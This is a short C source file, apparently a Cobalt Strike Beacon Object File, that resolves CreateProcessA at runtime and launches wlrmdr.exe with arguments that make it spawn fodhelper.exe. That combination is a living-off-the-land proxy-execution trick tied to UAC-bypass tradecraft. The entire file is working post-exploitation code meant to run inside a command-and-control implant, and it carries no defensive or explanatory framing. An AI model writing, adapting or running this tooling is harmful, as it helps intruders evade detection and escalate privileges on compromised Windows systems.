#include "beacon.h"
#include <windows.h>

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

#define COMMAND_LINE "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u fodhelper.exe"

void go(char *args, int len) {
    HMODULE kernel32 = KERNEL32$LoadLibraryA("Kernel32.dll");
    if (!kernel32) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load Kernel32.dll.");
        return;
    }

    CreateProcessA_t KERNEL32$CreateProcessA = (CreateProcessA_t) KERNEL32$GetProcAddress(kernel32, "CreateProcessA");
    VOID (WINAPI *KERNEL32$Sleep)(DWORD) = (VOID (WINAPI *)(DWORD)) KERNEL32$GetProcAddress(kernel32, "Sleep");

    if (!KERNEL32$CreateProcessA || !KERNEL32$Sleep) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve required functions.");
        return;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    char command[] = COMMAND_LINE;

    BOOL success = KERNEL32$CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully started process: %s | PID: %d", command, pi.dwProcessId);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to start process: %s", command);
    }
}